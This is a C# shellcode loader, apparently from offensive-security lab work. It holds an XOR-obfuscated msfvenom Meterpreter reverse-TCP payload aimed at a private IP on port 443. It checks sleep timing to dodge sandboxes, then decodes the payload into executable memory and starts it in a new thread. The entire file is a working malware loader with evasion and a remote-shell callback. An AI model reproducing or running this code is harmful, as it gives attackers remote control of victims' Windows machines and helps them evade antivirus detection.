using System.Runtime.InteropServices;
using System;

namespace rev
{
    public class Program
    {
        public const uint EXECUTEREADWRITE = 0x40;
        public const uint COMMIT_RESERVE = 0x3000;

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private unsafe static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 WaitForSingleObject(IntPtr Handle, Int32 Wait);

        public static void Main()
        {

            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp
            // XORed with key 0xfa
            byte[] buf = new byte[706] {
0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8,
0xab, 0xb2, 0xcb, 0x28, 0x9f, 0xb2, 0x71, 0xa8, 0x9a, 0xb2, 0x71, 0xa8, 0xe2, 0xac, 0xb2,
0x71, 0xa8, 0xda, 0xb2, 0xf5, 0x4d, 0xb0, 0xb0, 0xb2, 0x71, 0x88, 0xaa, 0xb7, 0xcb, 0x33,
0xb2, 0xcb, 0x3a, 0x56, 0xc6, 0x9b, 0x86, 0xf8, 0xd6, 0xda, 0xbb, 0x3b, 0x33, 0xf7, 0xbb,
0xfb, 0x3b, 0x18, 0x17, 0xa8, 0xbb, 0xab, 0xb2, 0x71, 0xa8, 0xda, 0x71, 0xb8, 0xc6, 0xb2,
0xfb, 0x2a, 0x9c, 0x7b, 0x82, 0xe2, 0xf1, 0xf8, 0xf5, 0x7f, 0x88, 0xfa, 0xfa, 0xfa, 0x71,
0x7a, 0x72, 0xfa, 0xfa, 0xfa, 0xb2, 0x7f, 0x3a, 0x8e, 0x9d, 0xb2, 0xfb, 0x2a, 0xbe, 0x71,
0xba, 0xda, 0xb3, 0xfb, 0x2a, 0x71, 0xb2, 0xe2, 0xaa, 0x19, 0xac, 0xb2, 0x05, 0x33, 0xbb,
0x71, 0xce, 0x72, 0xb7, 0xcb, 0x33, 0xb2, 0xfb, 0x2c, 0xb2, 0xcb, 0x3a, 0xbb, 0x3b, 0x33,
0xf7, 0x56, 0xbb, 0xfb, 0x3b, 0xc2, 0x1a, 0x8f, 0x0b, 0xb6, 0xf9, 0xb6, 0xde, 0xf2, 0xbf,
0xc3, 0x2b, 0x8f, 0x22, 0xa2, 0xbe, 0x71, 0xba, 0xde, 0xb3, 0xfb, 0x2a, 0x9c, 0xbb, 0x71,
0xf6, 0xb2, 0xbe, 0x71, 0xba, 0xe6, 0xb3, 0xfb, 0x2a, 0xbb, 0x71, 0xfe, 0x72, 0xbb, 0xa2,
0xbb, 0xa2, 0xb2, 0xfb, 0x2a, 0xa4, 0xa3, 0xa0, 0xbb, 0xa2, 0xbb, 0xa3, 0xbb, 0xa0, 0xb2,
0x79, 0x16, 0xda, 0xbb, 0xa8, 0x05, 0x1a, 0xa2, 0xbb, 0xa3, 0xa0, 0xb2, 0x71, 0xe8, 0x13,
0xb1, 0x05, 0x05, 0x05, 0xa7, 0xb2, 0xcb, 0x21, 0xa9, 0xb3, 0x44, 0x8d, 0x93, 0x94, 0x93,
0x94, 0x9f, 0x8e, 0xfa, 0xbb, 0xac, 0xb2, 0x73, 0x1b, 0xb3, 0x3d, 0x38, 0xb6, 0x8d, 0xdc,
0xfd, 0x05, 0x2f, 0xa9, 0xa9, 0xb2, 0x73, 0x1b, 0xa9, 0xa0, 0xb7, 0xcb, 0x3a, 0xb7, 0xcb,
0x33, 0xa9, 0xa9, 0xb3, 0x40, 0xc0, 0xac, 0x83, 0x5d, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f,
0x12, 0xf5, 0xfa, 0xfa, 0xfa, 0xcb, 0xc3, 0xc8, 0xd4, 0xcb, 0xcc, 0xc2, 0xd4, 0xce, 0xcf,
0xd4, 0xcb, 0xc2, 0xc9, 0xfa, 0xa0, 0xb2, 0x73, 0x3b, 0xb3, 0x3d, 0x3a, 0x41, 0xfb, 0xfa,
0xfa, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0x90, 0xf9, 0xa9, 0xb3, 0x40, 0xad, 0x73, 0x65, 0x3c,
0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0x12, 0x6d, 0xfa, 0xfa, 0xfa, 0xd5, 0x89, 0xb4, 0xc8,
0xab, 0xaa, 0xb3, 0x9b, 0xb9, 0xbb, 0xc3, 0xb3, 0x98, 0xbf, 0x92, 0x95, 0xab, 0x9c, 0x98,
0xb1, 0x8a, 0x80, 0x9d, 0xd7, 0xcc, 0x9b, 0x9b, 0xac, 0x8c, 0x9f, 0x8c, 0xc2, 0x8e, 0x8d,
0xbf, 0xb8, 0xb7, 0x95, 0xb8, 0xbb, 0xce, 0x96, 0xbc, 0xae, 0xa3, 0xb9, 0xaf, 0xbf, 0xb4,
0xbf, 0xb9, 0xca, 0xab, 0x90, 0xa5, 0xd7, 0xc9, 0xb2, 0x82, 0x95, 0xc2, 0x8a, 0xb2, 0xab,
0x91, 0xa9, 0xaa, 0x99, 0x9c, 0xcc, 0x96, 0x9f, 0xab, 0x96, 0xcb, 0xa5, 0x80, 0xbf, 0x80,
0xa9, 0xb3, 0xa2, 0xbd, 0xc2, 0xcd, 0xb3, 0xc2, 0xc9, 0xcf, 0x8a, 0xb6, 0xa9, 0xb4, 0xcf,
0x98, 0x93, 0x90, 0x88, 0xb2, 0x8a, 0x82, 0xc9, 0xb5, 0x95, 0xac, 0xa0, 0x8c, 0xca, 0x92,
0x94, 0xb8, 0x98, 0xa3, 0x88, 0xac, 0x89, 0xac, 0xbb, 0xc3, 0x9c, 0xac, 0xb8, 0xcb, 0x93,
0xcc, 0xc3, 0x90, 0xa0, 0x9b, 0x8b, 0xc2, 0xd7, 0x94, 0x96, 0x8e, 0xb2, 0xae, 0xb5, 0x91,
0x8c, 0xce, 0xbc, 0x9d, 0xb0, 0xbf, 0xb9, 0x8b, 0x8a, 0xcd, 0x9e, 0xfa, 0xb2, 0x73, 0x3b,
0xa9, 0xa0, 0xbb, 0xa2, 0xb7, 0xcb, 0x33, 0xa9, 0xb2, 0x42, 0xfa, 0xc8, 0x52, 0x7e, 0xfa,
0xfa, 0xfa, 0xfa, 0xaa, 0xa9, 0xa9, 0xb3, 0x3d, 0x38, 0x11, 0xaf, 0xd4, 0xc1, 0x05, 0x2f,
0xb2, 0x73, 0x3c, 0x90, 0xf0, 0xa5, 0xb2, 0x73, 0x0b, 0x90, 0xe5, 0xa0, 0xa8, 0x92, 0x7a,
0xc9, 0xfa, 0xfa, 0xb3, 0x73, 0x1a, 0x90, 0xfe, 0xbb, 0xa3, 0xb3, 0x40, 0x8f, 0xbc, 0x64,
0x7c, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb7, 0xcb, 0x3a, 0xa9, 0xa0, 0xb2, 0x73, 0x0b,
0xb7, 0xcb, 0x33, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0xb3, 0x3d, 0x38, 0xd7, 0xfc, 0xe2, 0x81,
0x05, 0x2f, 0x7f, 0x3a, 0x8f, 0xe5, 0xb2, 0x3d, 0x3b, 0x72, 0xe9, 0xfa, 0xfa, 0xb3, 0x40,
0xbe, 0x0a, 0xcf, 0x1a, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x05, 0x35, 0x8e, 0xf8,
0x11, 0x50, 0x12, 0xaf, 0xfa, 0xfa, 0xfa, 0xa9, 0xa3, 0x90, 0xba, 0xa0, 0xb3, 0x73, 0x2b,
0x3b, 0x18, 0xea, 0xb3, 0x3d, 0x3a, 0xfa, 0xea, 0xfa, 0xfa, 0xb3, 0x40, 0xa2, 0x5e, 0xa9,
0x1f, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x69, 0xa9, 0xa9, 0xb2, 0x73, 0x1d, 0xb2,
0x73, 0x0b, 0xb2, 0x73, 0x20, 0xb3, 0x3d, 0x3a, 0xfa, 0xda, 0xfa, 0xfa, 0xb3, 0x73, 0x03,
0xb3, 0x40, 0xe8, 0x6c, 0x73, 0x18, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x79, 0x3e,
0xda, 0x7f, 0x3a, 0x8e, 0x48, 0x9c, 0x71, 0xfd, 0xb2, 0xfb, 0x39, 0x7f, 0x3a, 0x8f, 0x28,
0xa2, 0x39, 0xa2, 0x90, 0xfa, 0xa3, 0x41, 0x1a, 0xe7, 0xd0, 0xf0, 0xbb, 0x73, 0x20, 0x05,
0x2f
};
            int payloadSize = buf.Length;
            IntPtr payAddr = VirtualAlloc(IntPtr.Zero, payloadSize, COMMIT_RESERVE, EXECUTEREADWRITE);
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }
            Marshal.Copy(buf, 0, payAddr, payloadSize);
            IntPtr payThreadId = CreateThread(IntPtr.Zero, 0, payAddr, IntPtr.Zero, 0, 0);
            int waitResult = WaitForSingleObject(payThreadId, -1);
        }
    }
}
